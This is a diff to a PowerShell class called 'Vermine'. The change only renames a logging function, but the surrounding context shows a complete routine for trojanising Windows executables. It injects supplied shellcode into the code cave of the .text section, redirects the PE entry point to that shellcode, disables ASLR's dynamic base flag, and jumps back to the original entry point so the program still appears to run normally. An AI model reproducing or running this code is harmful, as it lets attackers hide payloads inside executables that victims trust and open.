@@ -10,14 +10,14 @@ class Vermine {
         if ($null -ne $shellcodeBinPath) {
             $shellcode = [System.IO.File]::ReadAllBytes($shellcodeBinPath)
         } elseif ($null -eq $shellcode) {
-            Conwrite -do !$silent -name $dbgName -msg "Shellcode bytes nor bin path set!" -msgColor Red
+            Write-Console -do !$silent -name $dbgName -msg "Shellcode bytes nor bin path set!" -msgColor Red
             return
         }
 
         # Setup | File
         $bytes = [System.IO.File]::ReadAllBytes($inPath)
 
-        Conwrite -do $verbose -name $dbgName -msg "Read all bytes from [$inPath]"
+        Write-Console -do $verbose -name $dbgName -msg "Read all bytes from [$inPath]"
         
         # Setup | PE Header offsets
         $e_lfanew = [BitConverter]::ToUInt32($bytes, 0x3C)
@@ -30,7 +30,7 @@ class Vermine {
         | Section table offset: + 0x18 + $($sizeOfOptionalHeader.ToString("X8")): $($sectionTableOffset.ToString("X8"))
 "@
 
-        Conwrite -do $verbose -msg "Setup PE header offsets:" -data $dbgHeaderOffsets
+        Write-Console -do $verbose -msg "Setup PE header offsets:" -data $dbgHeaderOffsets
 
         # Setup | .text section
         $textHeaderOffset = $sectionTableOffset
@@ -47,7 +47,7 @@ class Vermine {
         | Raw Address: $($textRawAddr.ToString("X8"))
 "@
 
-        Conwrite -do $verbose -msg "Assumed .text as first section of sectionTable" -data $dbgText
+        Write-Console -do $verbose -msg "Assumed .text as first section of sectionTable" -data $dbgText
 
         # Append | Jump back to Original Entry Point (OEP)
         $imageBase = [BitConverter]::ToUInt64($bytes, $e_lfanew + 0x30)
@@ -68,7 +68,7 @@ class Vermine {
         | Absolute OEP: Image Base + OEP: $($absOEP.ToString("X8"))
 "@
 
-        Conwrite -do $verbose -msg "Calculated absolute OEP to jump back to. Appended simple 'jmp' instruction" -data $dbgAbsOEP
+        Write-Console -do $verbose -msg "Calculated absolute OEP to jump back to. Appended simple 'jmp' instruction" -data $dbgAbsOEP
 
         # Disable DLL can move (Dynamic Base) in DLLCharacteristics to properly resolve absolute OEP (absOEP)
         $dllCharsOffset = $e_lfanew + 0x5E
@@ -83,7 +83,7 @@ class Vermine {
         | New DLLChars: Old DLL Chars - 0x0040 (Dynamic Base flag): $nDllChars
 "@
 
-        Conwrite -do $verbose -msg "Updated DLLCharacteristics with DYNAMIC_BASE disabled. Allows proper resolve of absolute OEP" -data $dbgCharsOffset
+        Write-Console -do $verbose -msg "Updated DLLCharacteristics with DYNAMIC_BASE disabled. Allows proper resolve of absolute OEP" -data $dbgCharsOffset
 
         # Calc | Free bucket space to inject shellcode
         $injectionRawOffset = $textRawAddr + $textVSize
@@ -94,28 +94,28 @@ class Vermine {
             return
         }
 
-        Conwrite -do $verbose -msg "Calculated raw offset to insert shellcode at: .text rawAddr + .text vSize: $($injectionRawOffset.ToString("X8"))"
-        Conwrite -do $verbose -msg "Calculated new entry point RVA: .text vAddr + .text vSize: $($newEntryPointRVA.ToString("X8"))"
+        Write-Console -do $verbose -msg "Calculated raw offset to insert shellcode at: .text rawAddr + .text vSize: $($injectionRawOffset.ToString("X8"))"
+        Write-Console -do $verbose -msg "Calculated new entry point RVA: .text vAddr + .text vSize: $($newEntryPointRVA.ToString("X8"))"
 
         # Update | .text virtual size
         $newVSize = $textVSize + $finalshc.Length
         [BitConverter]::GetBytes([uint32]$newVSize).CopyTo($bytes, $textHeaderOffset + 0x08)
 
-        Conwrite -do $verbose -msg "Updated .text virtual size with shellcode bytes: textVSize ($textVSize) + shellcodeLength ($($finalshc.Length)): $newVSize"
+        Write-Console -do $verbose -msg "Updated .text virtual size with shellcode bytes: textVSize ($textVSize) + shellcodeLength ($($finalshc.Length)): $newVSize"
 
         # Update | Entry point RVA
         [BitConverter]::GetBytes([uint32]$newEntryPointRVA).CopyTo($bytes, $e_lfanew + 0x28)
 
-        Conwrite -do $verbose -msg "Updated entry point RVA (e_lfanew + 0x28) with new entry point RVA: $($newEntryPointRVA.ToString("X8"))"
+        Write-Console -do $verbose -msg "Updated entry point RVA (e_lfanew + 0x28) with new entry point RVA: $($newEntryPointRVA.ToString("X8"))"
 
         # Write | Shellcode into the codecave
         [Array]::Copy($finalshc, 0, $bytes, $injectionRawOffset, $finalshc.Length)
 
-        Conwrite -do $verbose -msg "Wrote final shellcode to bytes at raw injection offset: $($injectionRawOffset.ToString("X8"))"
+        Write-Console -do $verbose -msg "Wrote final shellcode to bytes at raw injection offset: $($injectionRawOffset.ToString("X8"))"
 
         # --- 6. Save File ---
         [System.IO.File]::WriteAllBytes($outPath, $bytes)
-        Conwrite -do (-not $silent) -name "/$dbgName" -msg "Wrote modified PE bytes to output file [$outPath]"
+        Write-Console -do (-not $silent) -name "/$dbgName" -msg "Wrote modified PE bytes to output file [$outPath]"
     }
 
     static [void]InjectShc([string]$inPath, [string]$outPath, [byte[]]$shellcode) {
